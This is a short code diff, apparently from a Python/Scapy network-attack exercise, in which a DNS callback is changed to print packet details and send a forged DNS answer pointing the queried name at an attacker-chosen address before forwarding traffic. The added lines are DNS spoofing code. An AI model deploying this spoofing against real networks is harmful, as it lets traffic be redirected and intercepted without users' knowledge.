@@ -48,9 +48,14 @@ def dns_callback(packet, extra_args):
 	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
 	if DNS in packet:
 		print("DNS packet: " + packet.summary())
-		print("source ip: " + packet.src)
-		print("dest ip: " + packet.dst)
-		print("Requested website: " + packet.qd.qname)
+		print("Source IP: " + packet[IP].src)
+		print("Dest IP: " + packet[IP].dst)
+		print("Source Port: " + str(packet[UDP].sport))
+		print("Dest Port: " + str(packet[UDP].dport))
+		print("Requested website: " + str(packet.qd.qname))
+		print()
+		response = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNSRR(rdata=extra_args[0], rrname=packet.qd.qname)
+		send(response)
 
 
 
